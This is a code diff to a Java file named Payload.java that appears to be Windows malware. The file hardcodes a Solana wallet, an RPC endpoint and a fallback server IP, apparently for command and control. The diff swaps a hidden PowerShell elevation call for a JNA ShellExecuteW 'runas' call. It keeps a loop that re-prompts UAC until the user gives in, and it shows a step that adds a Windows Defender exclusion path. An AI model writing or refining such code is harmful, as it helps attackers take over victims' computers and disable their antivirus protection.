@@ -1,4 +1,5 @@
 // language: Java, file: payload/Payload.java
+import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -7,6 +8,11 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
+    public interface Shell32 extends Library {
+        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
+        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
+    }
+
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -30,15 +36,13 @@ public class Payload {
 
             if (!isAdmin()) {
                 log("Not admin. Starting UAC...");
-                // Ask for UAC and wait for the user to click
                 boolean accepted = askForAdmin(key, ip);
                 
                 if (accepted) {
-                    log("UAC Accepted by user. Parent exiting.");
+                    log("UAC Accepted. Parent exiting.");
                     System.exit(0);
                 } else {
-                    log("UAC Denied by user. Retrying...");
-                    // If they deny, try again
+                    log("UAC Denied. Retrying...");
                     while (!askForAdmin(key, ip)) {
                         log("UAC Denied again. Retrying...");
                     }
@@ -59,25 +63,19 @@ public class Payload {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javaExe = javaHome + "\\bin\\javaw.exe";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
-            File lockFile = new File(getLoaderDir(), ".lock");
-
-            String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
-                javaExe, jarPath, key, ip
-            );
-
-            FileOutputStream lockStream = new FileOutputStream(lockFile);
-
-            // Launch PowerShell hidden. Wait for the user to click Yes or No.
-            Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
-            p.waitFor();
             
-            // If the user clicked Yes, the elevated process deleted the lock file.
-            if (!lockFile.exists() || lockFile.delete()) {
-                lockStream.close();
-                return true;
+            log("Triggering UAC via JNA...");
+            
+            // JNA ShellExecuteW returns > 32 if the user clicked Yes
+            int result = Shell32.INSTANCE.ShellExecuteW(
+                null, "runas", javaExe, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 1
+            );
+            
+            log("ShellExecuteW result: " + result);
+            
+            if (result > 32) {
+                return true; 
             } else {
-                lockStream.close();
                 return false;
             }
         } catch (Exception e) {
@@ -193,12 +191,6 @@ public class Payload {
         try {
             log("Executing payload...");
             File loaderDir = getLoaderDir();
-            
-            File lock = new File(loaderDir, ".lock");
-            if (lock.exists()) {
-                lock.delete();
-                log("Deleted .lock file to notify parent.");
-            }
 
             log("Adding AV exclusion...");
             String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
